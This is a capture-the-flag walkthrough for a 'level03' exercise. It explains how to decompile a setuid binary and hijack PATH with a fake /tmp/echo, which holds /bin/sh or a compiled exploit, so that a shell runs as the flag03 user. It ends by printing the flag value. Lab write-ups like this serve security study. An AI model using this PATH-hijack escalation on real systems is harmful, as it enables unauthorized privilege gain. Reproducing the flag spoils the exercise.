# level03

It is possible to run almost any executable with elevated privileges in this exercise, I chose sh as it permits pretty much anything

1. Decompile binary, see that it runs as flag03
2. Exploit env vars usage by changing $PATH
3. Create an exploit binary to be executed by the original binary
4. Execute original binary and retrieve flag

in kali: scp executable from target machine

in kali:

```shell
/opt/retdec/bin/retdec-decompiler.py level03
```

OPTION 1:

 ```shell
 PATH=/tmp:$PATH
 ```

 ```shell
 echo /bin/sh > /tmp/echo
 ```

 ```shell
 chmod +x /tmp/echo
 ```

 ```shell
 ./level03
 ```

 Optional (proof that we operate as flag03):

 ```shell
 whoami
 ```

 ```shell
 getflag
 ```

 gives: qi0maab88jeaj46qoumi7maus

OPTION 2:

 ```shell
 cd /tmp
 ```

 ```shell
 vim main.c
 ```

 Copy-Paste exploit.c

 ```shell
 gcc main.c -o echo
 ```

 ```shell
 ~/level03
 ```

 Optional (proof that we operate as flag03):

 ```shell
 whoami
 ```

 ```shell
 getflag
 ```

 gives flag:

 ```shell
 qi0maab88jeaj46qoumi7maus
 ```
